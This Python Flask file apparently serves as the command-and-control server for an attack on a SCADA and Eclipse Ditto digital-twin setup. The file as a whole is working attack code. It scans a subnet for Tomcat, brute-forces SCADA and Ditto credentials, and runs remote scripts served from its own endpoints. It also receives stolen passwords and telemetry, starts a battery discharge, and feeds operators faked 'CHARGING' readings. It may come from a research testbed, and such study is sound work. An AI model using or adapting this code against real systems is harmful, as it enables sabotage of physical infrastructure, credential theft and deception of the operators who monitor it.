from flask import Flask, request
import nmap
import time
import threading
from RCE import RCE
from utils import *

this_ip = get_ip_address('eth0')
substitute_in_file('scripts/fetch_ip_ditto.sh', {'this_ip': this_ip})
substitute_in_file('scripts/substitute_host.sh', {'this_ip': this_ip})

ATTACK_LENGTH = 120 #seconds

ip_ditto = None
password_ditto = None
last_data_ditto = {}
delta_energy_store = 50
delta_battery_percent = 0.005

scanner = nmap.PortScanner()
scada_url = ''
time.sleep(15)
scanner.scan('172.16.10.0-255')
for host in scanner.all_hosts():
    if 'tcp' not in scanner[host]: continue
    for port in scanner[host]['tcp'].keys():
        if scanner[host]['tcp'][port]['product'] == 'Apache Tomcat':
            scada_url = f'http://{host}:{port}'
            break
print(f"Found Scada URL: ", scada_url)

def update_system(user, passw):
    global scada_url, this_ip
    rce = RCE(scada_url, user, passw, this_ip)
    rce.execute_script('start_discharge.sh')
    for _ in range(ATTACK_LENGTH):
        time.sleep(0.1)
        rce.execute_script('fetch_turbine_ditto.sh')
        try:
            last_data_ditto['FDT:energy-store-1']['battery-pack']['properties']['energy-stored'] += delta_energy_store
            last_data_ditto['FDT:energy-store-1']['battery-pack']['properties']['charge-percent'] += delta_battery_percent
            last_data_ditto['FDT:energy-store-1']['battery-pack']['properties']['state'] = 'CHARGING'

            print(f'Energy Pack: {last_data_ditto['FDT:energy-store-1']['battery-pack']}', flush=True)
        except Exception:
            continue

def attack():
    global password_ditto, scada_url, this_ip
    credientials_scada_user = bruteforce_password_scada(scada_url, 'wordlist/usernames.txt', 'wordlist/passwords.txt')   
    while len(credientials_scada_user) == 0:
        time.sleep(5)
    rce = RCE(scada_url, credientials_scada_user[0][0], credientials_scada_user[0][1], this_ip)
    rce.execute_script('fetch_ip_ditto.sh')
    bruteforce_password_ditto(scada_url, rce, 'wordlist/passwords.txt')
    print("End bruteforce ditto", flush=True)
    while password_ditto is None:
        time.sleep(5)
    print("Substituting", flush=True)
    substitute_in_file('scripts/fetch_data_ditto.sh', {'password_ditto': password_ditto})
    substitute_in_file('scripts/fetch_turbine_ditto.sh', {'password_ditto': password_ditto})
    substitute_in_file('scripts/start_discharge.sh', {'password_ditto': password_ditto})
    rce.execute_script('fetch_data_ditto.sh')
    rce.execute_script('substitute_host.sh')
    updateThread = threading.Thread(target=update_system, args=(credientials_scada_user[0][0], credientials_scada_user[0][1]))
    updateThread.start()
    time.sleep(ATTACK_LENGTH)
    rce.execute_script('revert_host.sh') 
    rce.execute_script('fetch_data_ditto.sh') 

app = Flask(__name__)

@app.route('/get_script/<string:name>')
def get_script(name):
    if not name: return "error"

    with open('scripts/'+name, 'r') as f:
        return f.read()

@app.route('/ip_ditto', methods=["POST"])
def route_ip_ditto():
    ip_ditto = str(request.get_data().decode())
    print("IP DITTO FRONTEND: "+ip_ditto, flush=True)
    
    substitute_in_file('scripts/fetch_data_ditto.sh', 
        {'ip_ditto': ip_ditto, 
        'this_ip': this_ip})
    substitute_in_file('scripts/fetch_turbine_ditto.sh', 
        {'ip_ditto': ip_ditto, 
        'this_ip': this_ip})
    substitute_in_file('scripts/start_discharge.sh', 
        {'ip_ditto': ip_ditto, 
        'this_ip': this_ip})
    substitute_in_file('scripts/check_credential_ditto.sh', 
    {'ip_ditto': ip_ditto,
    'this_ip': this_ip})

    return "Stored"

@app.route('/credential_ditto/<string:password>', methods=["POST"])
def route_credential_ditto(password):
    global password_ditto
    if str(request.get_data().decode()) == '{':
        password_ditto = password
        print("Found password: ", password_ditto, flush=True)

    return "Stored"

@app.route('/data_ditto', methods=["POST"])
def route_data_ditto():
    json = request.get_json()
    print(f'OLD Ditto: {last_data_ditto}', flush=True)
    for thing in json['items']:
        last_data_ditto[thing['thingId']] = thing['features']
    
    print(f'NEW Ditto: {last_data_ditto}', flush=True)
    return "Stored"

@app.route('/turbine_ditto', methods=["POST"])
def route_turbine_ditto():
    last_data_ditto['turbine'] = request.get_json()

    print(f'Turbine: {last_data_ditto['turbine']}', flush=True)
    return "Stored"

@app.route('/api/2/things/<string:thing_id>/features')
def route_simulation(thing_id):
    return last_data_ditto[thing_id]

@app.route('/start_attack')
def route_start_attack():
    attackThread = threading.Thread(target=attack, args=())
    attackThread.start()

    return "ATTACK STARTED"

if __name__ == "__main__":
    app.run('0.0.0.0', 80)